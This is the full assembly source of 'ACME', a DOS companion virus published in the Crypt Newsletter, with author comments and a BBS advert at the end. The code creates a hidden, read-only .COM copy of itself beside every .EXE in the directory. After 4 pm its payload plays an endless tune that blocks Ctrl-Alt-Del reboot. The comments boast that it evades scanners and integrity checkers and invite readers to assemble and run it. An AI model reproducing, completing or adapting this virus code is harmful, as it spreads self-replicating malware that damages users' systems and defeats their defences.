; ACME COMPANION VIRUS for Crypt Newsletter 9
;
; ACME is a fast and simple companion virus which will create a
; spawned copy of itself for EVERY .EXE file it can find in the
; current directory. 
;
; ACME is ready to assemble using A86. If you recall, an earlier Crypt
; letter included an A86-only source listing. (Strict TASM/MASM compatible 
; assemblers will need the manual addition of a couple simple declarative 
; statements.) I included ACME in this form so fans of Isaacson's 
; technique can gloat about the code not requiring "red tape." ;-]
; A86 will assemble ACME directly to a .COMfile virus, no linker
; necessary.
; 
; ACME currently eludes all scanners and as a companion virus, openly
; defies every integrity checker I have in my inventory with the EXCEPTION
; of Stiller Research's.  This issue includes a quality report on
; Solomon's Toolkit, so it's only fair to state that while the documentation
; for this product seems to indicate that the developers know what a 
; companion infection is, the software does nothing to protect against
; it in default mode. ACME flies through the Toolkit, for now. Go figure.
;
; ACME will also play a generic ACME-style virus tune late in the
; afternoon. Those who fancy a musical virus but have never heard one are
; encouraged to play with ACME. Set your system clock to anytime after
; 4:00 pm. The musical payload takes up most of the space in this virus,
; removing it shaves the virus to 242 bytes - nice and small if you like.
;
; The virus purist may recognize the root of ACME as a piece of code known
; as ZENO - a small, single-step companion infector. ZENO's author is
; thanked, wherever he/she is.


START:          

		jmp  VIR_BEGIN    ; get going


WILDCARD        DB  "*.EXE",0
FILE_EXT        DB  "COM",0
FILE_FOUND      DB  12 DUP(' '), 0
FILE_CREATE     DB  12 DUP(' '), 0
SEARCH_ATTRIB   DW  17H
NUM_INFECT      DW  0
MUZIK           DW      4304,0006, 4063,0006, 4304,0006, 4063,0006, ;MUZIK - notes/delay
		DW      3043,0006, 4831,0006, 4063,0006, 3043,0006, ;in format xxxx,yyyy
		DW      4304,0006, 4063,0006, 4304,0006, 4063,0006,
		DW      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
		DW      4304,0006, 4063,0006, 4304,0006, 4063,0006,
		DW      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
		DW      4304,0006, 4063,0006, 4304,0006, 4063,0006,
		DW      3043,0006, 5119,0006, 5423,0006, 3043,0006, 
		DW      6087,0020, 

		DW      6087,0006, 
		DW      7239,0006, 3619,0006, 4831,0006, 6087,0006
		DW      7670,0006, 7239,0006, 4831,0006, 3619,0006

		DW      6087,0006, 4063,0006, 3043,0006, 5119,0006
		DW      4831,0006, 6087,0006, 7239,0006, 8126,0006
		DW      6087,0020, 

		DW      4304,0006, 4063,0006, 4304,0006, 4063,0006,
		DW      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
		DW      4304,0006, 4063,0006, 4304,0006, 4063,0006,
		DW      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
		DW      4304,0006, 4063,0006, 4304,0006, 4063,0006,
		DW      3043,0006, 5119,0006, 5423,0006, 3043,0006, 
		DW      6087,0020, 

		DW      6087,0006, 
		DW      7239,0006, 3619,0006, 4831,0006, 6087,0006
		DW      7670,0006, 7239,0006, 4831,0006, 3619,0006

		DW      6087,0006, 4063,0006, 3043,0006, 5119,0006
		DW      4831,0006, 6087,0006, 7239,0006, 8126,0006
		DW      6087,0020, 

		DW      7670,0006, 7239,0006, 4831,0006, 3619,0006
		DW      3043,0006, 3619,0006, 4831,0006, 6087,0006
		DW      3043,0010, 

		DW      4304,0006, 4063,0006, 4304,0006, 4063,0006,
		DW      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
		DW      4304,0006, 4063,0006, 4304,0006, 4063,0006,
		DW      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
		DW      4304,0006, 4063,0006, 4304,0006, 4063,0006,
		DW      3043,0006, 5119,0006, 5423,0006, 3043,0006, 
		DW      6087,0020, 

		DW      7670,0006, 7239,0006, 4831,0006, 3619,0006
		DW      3043,0006, 3619,0006, 4831,0006, 6087,0006
		DW      3043,0010, 

		DW      6087,0006, 
		DW      7239,0006, 3619,0006, 4831,0006, 6087,0006
		DW      7670,0006, 7239,0006, 4831,0006, 3619,0006

		DW      6087,0006, 4063,0006, 3043,0006, 5119,0006
		DW      4831,0006, 6087,0006, 7239,0006, 8126,0006
		DW      6087,0020, 

		DW      0ffffh



My_Cmd:
CMD_LEN         DB  13
FILE_CLONE      DB  12 DUP (' '), 0

;------------------------------------------------------------------;
Prepare_command:
	       cld
	       mov    di,OFFSET FILE_CLONE
	       mov    al,0
	       mov    cx,12
	       repne scasb          ; find the end of string \0

	       mov    al,0Dh        ; <CR>
	       stosb                ; replace \0 with a <CR>

	       mov    ax,12         ;store length of the command
	       sub    ax,cx
	       mov    CMD_LEN, al
	       ret

;------------------------------------------------------------------;
Store_name:

	       mov    di,OFFSET FILE_FOUND   ;Point to buffer.
	       mov    si,158                 ;stow the file found in buffer
	       mov    cx,12
	       rep movsb

	       mov    di,OFFSET FILE_CREATE  ;Point to buffer.
	       mov    si,158
	       mov    cx,12
	       rep movsb

	       cld
	       mov    di,OFFSET FILE_CREATE
	       mov    al,'.'
	       mov    cx,9
	       repne scasb                   ;find the '.'

	       mov    si,OFFSET FILE_EXT
	       mov    cx,3
	       rep movsb                     ;replace the .EXE with .COM
					     ;from buffer
	       ret


;------------------------------------------------------------------;
				      ;Does the file exist?

Check_file:
	       mov    dx,OFFSET FILE_CREATE
	       mov    cx,0
	       mov    ax,3d00h        ; Open file, read only
	       int    21h

Chk_done:
	       ret

;------------------------------------------------------------------;
Infect_file:                                  ;create companion routine
					      
	       mov    dx,OFFSET FILE_CREATE   ;contains name of "companion"
	       mov    cx,0
	       mov    ah,3ch                  ;construct file
	       int    21h
	       jc     EXIT

					      ;Write virus to companion file
	       mov    bx,ax
	       mov    cx,(OFFSET END_OF_CODE - OFFSET START) ;virus length
	       mov    dx,OFFSET START
	       mov    ah,40h                  ;write to file function
	       int    21h                     ;do it

					      ;Close file
	       mov    ah,3eh    ; ASSUMES bx still has file handle
	       int    21h

					      ;Change attributes
	       mov    dx,OFFSET FILE_CREATE   ;of created file to
	       mov    cx,3          ;(1) read only and (2) hidden
	       mov    ax,4301h
	       int    21h

	       ret

;------------------------------------------------------------------
; Read all the directory filenames and store as records in buffer. 
;------------------------------------------------------------------

Vir_begin:
	       mov     ah,02Ch          ;DOS get time function
	       int     021h
	       mov     al,ch            ;Copy hour into AL
	       cbw                      ;Sign-extend AL into AX
	       cmp     ax,0010h         ;Did the function return 16 (4 pm)?
	       jge     TOON             ;If greater than or equal, muzik!
	       
	       
	       mov    sp,offset STACK_HERE   ;move stack down
	       mov    bx,sp
	       add    bx,15
	       mov    cl,4
	       shr    bx,cl
	       mov    ah,4ah                  ;deallocate rest of memory
	       int    21h

	       mov    di,OFFSET FILE_CLONE   ;Point to buffer.
	       mov    si,OFFSET FILE_FOUND
	       mov    cx,12
	       rep    movsb

Read_dir:      mov    dx,OFFSET WILDCARD   ;file mask for directory search
	       mov    cx,SEARCH_ATTRIB

	       mov    ah,4Eh                ;find the first matching file
	       int    21h

	       jc     EXIT                   ;If empty directory, exit

Do_file:
	       call   STORE_NAME
	       call   CHECK_FILE
	       call   INFECT_FILE



Find_next:
	       mov   ah,4fh          ; find next file and keep finding until
	       int   21h             ; all 
	       jnz   Do_File         ; infected

Exit:

					  ; Run the original program
	       call   Prepare_command
	       mov    si, OFFSET MY_CMD
	       int    2Eh                 ; Pass command to command
					  ; interpreter for execution
					  
	       mov    ax,4C00H            ; Exit to DOS
	       int    21h

;-------------------------------------------------------------------
;This routine enables ACME virus to compel the pc to play the 
;ACME virus song just about the time the clock-watchers are getting
;ready to leave
;-------------------------------------------------------------------
TOON:
	       cli                        ;interrupts off
	       mov     al,10110110xb      ;the number
	       out     43h,al             ;to send to the speaker
	       lea     si,MUZIK           ;point (si) to the ACME note table

TOON2:         cld                        
	       lodsw                    ;load word into ax and increment (si)
	       cmp     ax,0ffffh        ;is it ffff? If so, end of table
	       jz      GO_MUZIK2        ;so, time to jump into endless loop
	       out     42h,al           
	       mov     al,ah            
	       out     42h,al           ;send it next
	       in      al,61h           ;get value to turn on speaker
	       or      al,00000011xb    ;OR the gotten value
	       out     61h,al           ;now we turn on speaker
	       lodsw                    ;load the repeat loop count into (ax)
LOOP6:  
		mov     cx,8000         ;delay count
LOOP7:  
		loop    LOOP7           ;do the delay
		dec     ax              ;decrement repeat count
		jnz     LOOP6           ;if not = 0 loop back
		in      al,61h          ;all done
		and     al,11111100xb   ;number turns speaker off
		out     61h,al          ;send it
		jmp     short TOON2     ;now go do next note
GO_MUZIK2:                              ;our loop point
	
		sti                  ;enable interrupts
		jmp    TOON          ;jump back to beginning - this code
				     ; has the additional advantage of
				     ;locking out CTRL-ALT-DEL reboot.
			;The user must do a hard reset to recover from ACME.



END_OF_CODE     =       $

STACK_HERE      EQU   END_OF_CODE + 512


;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
